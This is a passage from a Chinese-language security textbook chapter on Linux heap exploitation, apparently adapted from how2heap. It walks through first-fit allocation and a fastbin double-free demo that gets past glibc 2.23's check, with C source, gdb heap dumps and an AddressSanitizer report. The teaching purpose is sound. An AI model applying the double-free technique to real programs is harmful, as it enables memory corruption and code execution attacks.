strcpy(b, "BBBBBBBB");
fprintf(stderr, "first allocation %p points to %s\n", a, a);
fprintf(stderr, "Freeing the first one...\n");
free(a);
c = malloc(500);
fprintf(stderr, "3rd malloc(500): %p\n", c);
strcpy(c, "CCCCCCCC");
fprintf(stderr, "3rd allocation %p points to %s\n", c, c);
fprintf(stderr, "first allocation %p points to %s\n", a, a);
}
427
3.1.6 Linux 堆利用（一）
$ gcc -g first_fit.c
$ ./a.out
1st malloc(512): 0x1380010
2nd malloc(256): 0x1380220
first allocation 0x1380010 points to AAAAAAAA
Freeing the first one...
3rd malloc(500): 0x1380010
3rd allocation 0x1380010 points to CCCCCCCC
first allocation 0x1380010 points to CCCCCCCC
这第一个程序展示了 glibc 堆分配的策略，即 first-fit。在分配内存时，malloc 会先
到 unsorted bin（或者fastbins） 中查找适合的被 free 的 chunk，如果没有，就会
把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中，然后再去这些 bins 里
去找合适的 chunk。可以看到第三次 malloc 的地址和第一次相同，即 malloc 找到
了第一次 free 掉的 chunk，并把它重新分配。
在 gdb 中调试，两个 malloc 之后（chunk 位于 malloc 返回地址减去 0x10 的位
置）：
gef➤ x/5gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000211 
#include 
#include 
int main() {
fprintf(stderr, "Allocating 3 buffers.\n");
char *a = malloc(9);
char *b = malloc(9);
char *c = malloc(9);
strcpy(a, "AAAAAAAA");
strcpy(b, "BBBBBBBB");
strcpy(c, "CCCCCCCC");
fprintf(stderr, "1st malloc(9) %p points to %s\n", a, a);
fprintf(stderr, "2nd malloc(9) %p points to %s\n", b, b);
fprintf(stderr, "3rd malloc(9) %p points to %s\n", c, c);
fprintf(stderr, "Freeing the first one %p.\n", a);
free(a);
fprintf(stderr, "Then freeing another one %p.\n", b);
free(b);
fprintf(stderr, "Freeing the first one %p again.\n", a);
free(a);
fprintf(stderr, "Allocating 3 buffers.\n");
char *d = malloc(9);
char *e = malloc(9);
char *f = malloc(9);
strcpy(d, "DDDDDDDD");
fprintf(stderr, "4st malloc(9) %p points to %s the first tim
e\n", d, d);
strcpy(e, "EEEEEEEE");
fprintf(stderr, "5nd malloc(9) %p points to %s\n", e, e);
strcpy(f, "FFFFFFFF");
fprintf(stderr, "6rd malloc(9) %p points to %s the second ti
me\n", f, f);
}
431
3.1.6 Linux 堆利用（一）
$ gcc -g fastbin_dup.c
$ ./a.out
Allocating 3 buffers.
1st malloc(9) 0x1c07010 points to AAAAAAAA
2nd malloc(9) 0x1c07030 points to BBBBBBBB
3rd malloc(9) 0x1c07050 points to CCCCCCCC
Freeing the first one 0x1c07010.
Then freeing another one 0x1c07030.
Freeing the first one 0x1c07010 again.
Allocating 3 buffers.
4st malloc(9) 0x1c07010 points to DDDDDDDD the first time
5nd malloc(9) 0x1c07030 points to EEEEEEEE
6rd malloc(9) 0x1c07010 points to FFFFFFFF the second time
这个程序展示了利用 fastbins 的 double-free 攻击，可以泄漏出一块已经被分配的
内存指针。fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin->fd
来遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同
一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，
从而绕过检查顺利执行。然后再 malloc 三次，就在同一个地址 malloc 了两次，也
就有了两个指向同一块内存区域的指针。
libc-2.23 中对 double-free 的检查过程如下：
/* Check that the top of the bin is not the record we are go
ing to add
(i.e., double free). */
if (__builtin_expect (old == p, 0))
{
errstr = "double free or corruption (fasttop)";
goto errout;
}
它在检查 fast bin 的 double-free 时只是检查了第一个块。所以其实是存在缺陷的。
三个 malloc 之后：
432
3.1.6 Linux 堆利用（一）
gef➤ x/15gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a
0x602010: 0x4141414141414141 0x0000000000000000
0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b
0x602030: 0x4242424242424242 0x0000000000000000
0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c
0x602050: 0x4343434343434343 0x0000000000000000
0x602060: 0x0000000000000000 0x0000000000020fa1 <-- top chunk
0x602070: 0x0000000000000000
第一个 free 之后，chunk a 被添加到 fastbins 中：
gef➤ x/15gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [
be freed]
0x602010: 0x0000000000000000 0x0000000000000000 <-- fd p
ointer
0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b
0x602030: 0x4242424242424242 0x0000000000000000
0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c
0x602050: 0x4343434343434343 0x0000000000000000
0x602060: 0x0000000000000000 0x0000000000020fa1
0x602070: 0x0000000000000000
gef➤ heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10] ← Chunk(addr=0x602010, size=0x20, f
lags=PREV_INUSE)
第二个 free 之后，chunk b 被添加到 fastbins 中：
433
3.1.6 Linux 堆利用（一）
gef➤ x/15gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [
be freed]
0x602010: 0x0000000000000000 0x0000000000000000 <-- fd p
ointer
0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [
be freed]
0x602030: 0x0000000000602000 0x0000000000000000 <-- fd p
ointer
0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c
0x602050: 0x4343434343434343 0x0000000000000000
0x602060: 0x0000000000000000 0x0000000000020fa1
0x602070: 0x0000000000000000
gef➤ heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10] ← Chunk(addr=0x602030, size=0x20, f
lags=PREV_INUSE) ← Chunk(addr=0x602010, size=0x20, flags=PREV_
INUSE)
此时由于 chunk a 处于 bin 中第 2 块的位置，不会被 double-free 的检查机制检查
出来。所以第三个 free 之后，chunk a 再次被添加到 fastbins 中：
434
3.1.6 Linux 堆利用（一）
gef➤ x/15gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [
be freed again]
0x602010: 0x0000000000602020 0x0000000000000000 <-- fd p
ointer
0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [
be freed]
0x602030: 0x0000000000602000 0x0000000000000000 <-- fd p
ointer
0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c
0x602050: 0x4343434343434343 0x0000000000000000
0x602060: 0x0000000000000000 0x0000000000020fa1
0x602070: 0x0000000000000000
gef➤ heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10] ← Chunk(addr=0x602010, size=0x20, f
lags=PREV_INUSE) ← Chunk(addr=0x602030, size=0x20, flags=PREV_
INUSE) ← Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) →
[loop detected]
此时 chunk a 和 chunk b 似乎形成了一个环。
再三个 malloc 之后：
gef➤ x/15gx 0x602010-0x10
0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk d,
chunk f
0x602010: 0x4646464646464646 0x0000000000000000
0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk e
0x602030: 0x4545454545454545 0x0000000000000000
0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c
0x602050: 0x4343434343434343 0x0000000000000000
0x602060: 0x0000000000000000 0x0000000000020fa1
0x602070: 0x0000000000000000
所以对于 fastbins，可以通过 double-free 泄漏出一个堆块的指针。
加上内存检测参数重新编译：
435
3.1.6 Linux 堆利用（一）
$ gcc -fsanitize=address -g fastbin_dup.c
$ ./a.out
Allocating 3 buffers.
1st malloc(9) 0x60200000eff0 points to AAAAAAAA
2nd malloc(9) 0x60200000efd0 points to BBBBBBBB
3rd malloc(9) 0x60200000efb0 points to CCCCCCCC
Freeing the first one 0x60200000eff0.
Then freeing another one 0x60200000efd0.
Freeing the first one 0x60200000eff0 again.
================================================================
=
==5650==ERROR: AddressSanitizer: attempting double-free on 0x602
00000eff0 in thread T0:
#0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-lin
ux-gnu/libasan.so.2+0x982ca)
#1 0x400ba3 in main /home/firmy/how2heap/fastbin_dup.c:22
#2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gn
u/libc.so.6+0x2082f)
#3 0x400878 in _start (/home/firmy/how2heap/a.out+0x400878)
0x60200000eff0 is located 0 bytes inside of 9-byte region [0x602
00000eff0,0x60200000eff9)
freed by thread T0 here:
#0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-lin
ux-gnu/libasan.so.2+0x982ca)
#1 0x400b0d in main /home/firmy/how2heap/fastbin_dup.c:18
#2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gn
u/libc.so.6+0x2082f)
previously allocated by thread T0 here:
#0 0x7fdc18ebf602 in malloc (/usr/lib/x86_64-linux-gnu/libas